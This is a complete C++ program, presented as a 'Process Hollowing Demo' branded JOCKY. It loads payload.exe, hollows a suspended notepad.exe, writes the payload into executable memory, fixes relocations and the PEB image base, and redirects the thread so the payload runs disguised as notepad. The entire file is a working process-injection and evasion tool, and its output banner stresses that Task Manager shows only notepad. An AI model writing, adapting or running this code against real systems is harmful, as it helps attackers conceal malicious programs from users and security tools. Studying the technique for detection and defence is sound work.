// hollow.cpp
// Process Hollowing demonstration
// Reads payload.exe, hollows notepad.exe, injects payload

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>

// NtUnmapViewOfSection is in ntdll but not in standard headers
// We load it manually at runtime
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

// ─────────────────────────────────────────────
// Step 0: Read payload.exe from disk into memory
// ─────────────────────────────────────────────
LPBYTE ReadPayloadFromDisk(const char* path, DWORD* outSize) {
    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open payload file: %d\n", GetLastError());
        return NULL;
    }

    *outSize = GetFileSize(hFile, NULL);
    LPBYTE buffer = (LPBYTE)malloc(*outSize);

    DWORD bytesRead = 0;
    ReadFile(hFile, buffer, *outSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Payload read from disk: %d bytes\n", *outSize);
    return buffer;
}

// ─────────────────────────────────────────────
// Relocation processing
// Needed if payload loads at different base than preferred
// ─────────────────────────────────────────────
void ApplyRelocations(
    HANDLE hProcess,
    LPBYTE localPayload,
    LPVOID remoteBase,
    ULONGLONG delta
) {
    if (delta == 0) {
        printf("[+] No relocations needed (loaded at preferred base)\n");
        return;
    }

    printf("[*] Applying relocations, delta: 0x%llX\n", delta);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)localPayload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(localPayload + dos->e_lfanew);

    IMAGE_DATA_DIRECTORY relocDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if (relocDir.VirtualAddress == 0) {
        printf("[*] No relocation table present (fixed binary — good)\n");
        return;
    }

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(localPayload + relocDir.VirtualAddress);

    DWORD processed = 0;

    while (processed < relocDir.Size) {
        DWORD blockSize = reloc->SizeOfBlock;
        if (blockSize == 0) break;

        DWORD numEntries =
            (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        PWORD entries =
            (PWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < numEntries; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;

            // IMAGE_REL_BASED_DIR64 = 10 — x64 absolute address relocation
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG remoteAddr =
                    (ULONGLONG)remoteBase + reloc->VirtualAddress + offset;

                // Read current value from remote process
                ULONGLONG currentValue = 0;
                ReadProcessMemory(
                    hProcess,
                    (LPVOID)remoteAddr,
                    &currentValue,
                    sizeof(ULONGLONG),
                    NULL
                );

                // Add delta to fix up the address
                ULONGLONG newValue = currentValue + delta;

                // Write back to remote process
                WriteProcessMemory(
                    hProcess,
                    (LPVOID)remoteAddr,
                    &newValue,
                    sizeof(ULONGLONG),
                    NULL
                );
            }
        }

        processed += blockSize;
        reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + blockSize);
    }

    printf("[+] Relocations applied\n");
}

// ─────────────────────────────────────────────
// Main hollowing logic
// ─────────────────────────────────────────────
int main() {
    printf("╔══════════════════════════════════════╗\n");
    printf("║   JOCKY Process Hollowing Demo       ║\n");
    printf("║   Target: notepad.exe                ║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    // ── 0. Read payload from disk ──────────────────────────────────────
    DWORD payloadSize = 0;
    LPBYTE payload = ReadPayloadFromDisk("payload.exe", &payloadSize);
    if (!payload) return 1;

    // Parse PE headers of payload
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] payload.exe is not a valid PE file\n");
        return 1;
    }

    PIMAGE_NT_HEADERS ntHeaders =
        (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] payload.exe has invalid NT signature\n");
        return 1;
    }

    printf("[+] Payload PE verified\n");
    printf("[+] Payload preferred base:  0x%llX\n",
           (ULONGLONG)ntHeaders->OptionalHeader.ImageBase);
    printf("[+] Payload image size:      0x%X bytes\n",
           ntHeaders->OptionalHeader.SizeOfImage);
    printf("[+] Payload entry point RVA: 0x%X\n",
           ntHeaders->OptionalHeader.AddressOfEntryPoint);
    printf("[+] Number of sections:      %d\n\n",
           ntHeaders->FileHeader.NumberOfSections);

    // ── 1. Launch notepad in SUSPENDED state ──────────────────────────
    printf("[*] Launching notepad.exe in suspended state...\n");

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    BOOL created = CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,   // command line
        NULL,   // process security attributes
        NULL,   // thread security attributes
        FALSE,  // don't inherit handles
        CREATE_SUSPENDED,  // KEY — frozen at creation, not running
        NULL,   // use parent's environment
        NULL,   // use parent's directory
        &si,
        &pi
    );

    if (!created) {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    printf("[+] Notepad launched suspended\n");
    printf("[+] PID: %d\n", pi.dwProcessId);
    printf("[+] TID: %d\n\n", pi.dwThreadId);

    // ── 2. Get thread context ──────────────────────────────────────────
    // Context holds the register state of the suspended main thread
    // We need it to find PEB and later to redirect execution
    printf("[*] Reading thread context...\n");

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;  // get all registers

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Thread context obtained\n");
    printf("[+] Current RIP: 0x%llX\n\n", ctx.Rip);

    // ── 3. Find PEB and read notepad's image base ──────────────────────
    // PEB (Process Environment Block) contains information about the process
    // including where its executable image is loaded in memory
    printf("[*] Locating PEB and notepad image base...\n");

    // Use NtQueryProcessInformation to get PEB address
    // This is the most reliable cross-version approach
    typedef NTSTATUS(NTAPI* NtQueryProcessInfo_t)(
        HANDLE,
        PROCESSINFOCLASS,
        PVOID,
        ULONG,
        PULONG
    );

    NtQueryProcessInfo_t NtQPI = (NtQueryProcessInfo_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtQueryInformationProcess"
    );

    if (!NtQPI) {
        printf("[-] Cannot find NtQueryProcessInformation\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLen = 0;
    NtQPI(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLen);

    LPVOID pebAddress = pbi.PebBaseAddress;
    printf("[+] PEB address: 0x%p\n", pebAddress);

    // Read ImageBase from PEB
    // On x64, PEB.ImageBaseAddress is at offset 0x10
    LPVOID notepadImageBase = NULL;
    ReadProcessMemory(
        pi.hProcess,
        (LPBYTE)pebAddress + 0x10,  // ImageBaseAddress field offset
        &notepadImageBase,
        sizeof(LPVOID),
        NULL
    );
    printf("[+] Notepad image base: 0x%p\n\n", notepadImageBase);

    // ── 4. Hollow notepad — unmap its executable image ─────────────────
    printf("[*] Hollowing notepad — unmapping its code...\n");

    NtUnmapViewOfSection_t NtUVoS = (NtUnmapViewOfSection_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

    if (!NtUVoS) {
        printf("[-] Cannot find NtUnmapViewOfSection\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    NTSTATUS status = NtUVoS(pi.hProcess, notepadImageBase);
    if (status != 0) {
        printf("[-] NtUnmapViewOfSection failed: 0x%X\n", status);
        printf("    notepad's code may be protected\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Notepad code successfully unmapped\n");
    printf("[+] Process container is now HOLLOW\n\n");

    // ── 5. Allocate memory for our payload ─────────────────────────────
    printf("[*] Allocating memory for payload at preferred base...\n");

    // Try to allocate at payload's preferred base address
    LPVOID allocBase = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,  // preferred base
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // must be executable
    );

    if (!allocBase) {
        // Preferred base not available (ASLR) — let OS choose
        printf("[*] Preferred base unavailable, using OS-assigned base\n");
        allocBase = VirtualAllocEx(
            pi.hProcess,
            NULL,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if (!allocBase) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Memory allocated at: 0x%p\n\n", allocBase);

    // ── 6. Write payload PE headers ────────────────────────────────────
    printf("[*] Writing payload into hollow process...\n");

    WriteProcessMemory(
        pi.hProcess,
        allocBase,
        payload,
        ntHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    );
    printf("[+] PE headers written\n");

    // ── 7. Write each section ──────────────────────────────────────────
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        // Skip empty sections
        if (section->SizeOfRawData == 0) {
            section++;
            continue;
        }

        LPVOID sectionDest = (LPBYTE)allocBase + section->VirtualAddress;

        WriteProcessMemory(
            pi.hProcess,
            sectionDest,
            payload + section->PointerToRawData,
            section->SizeOfRawData,
            NULL
        );

        printf("[+] Section written: %-8.8s | RVA: 0x%08X | Size: 0x%X\n",
               section->Name,
               section->VirtualAddress,
               section->SizeOfRawData);

        section++;
    }

    // ── 8. Apply relocations if base address changed ───────────────────
    ULONGLONG delta =
        (ULONGLONG)allocBase - ntHeaders->OptionalHeader.ImageBase;

    ApplyRelocations(pi.hProcess, payload, allocBase, delta);

    // ── 9. Update PEB ImageBase to our payload ─────────────────────────
    WriteProcessMemory(
        pi.hProcess,
        (LPBYTE)pebAddress + 0x10,
        &allocBase,
        sizeof(LPVOID),
        NULL
    );
    printf("[+] PEB ImageBase updated\n");

    // ── 10. Redirect execution to our payload entry point ──────────────
    printf("\n[*] Redirecting execution to payload entry point...\n");

    ULONGLONG newEntryPoint =
        (ULONGLONG)allocBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    // On x64, when a process is freshly created and suspended,
    // RCX holds the entry point address (the loader calls it via RCX)
    ctx.Rcx = newEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Entry point set to: 0x%llX\n", newEntryPoint);

    // ── 11. Resume — payload executes inside notepad ───────────────────
    printf("\n[*] Resuming thread...\n");
    ResumeThread(pi.hThread);

    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║  HOLLOWING COMPLETE                              ║\n");
    printf("║                                                  ║\n");
    printf("║  Payload is running inside notepad.exe           ║\n");
    printf("║  PID: %-5d                                      ║\n", pi.dwProcessId);
    printf("║                                                  ║\n");
    printf("║  Check Task Manager — you see notepad            ║\n");
    printf("║  But JOCKY's code is what's executing inside     ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");

    // Clean up handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(payload);

    return 0;
}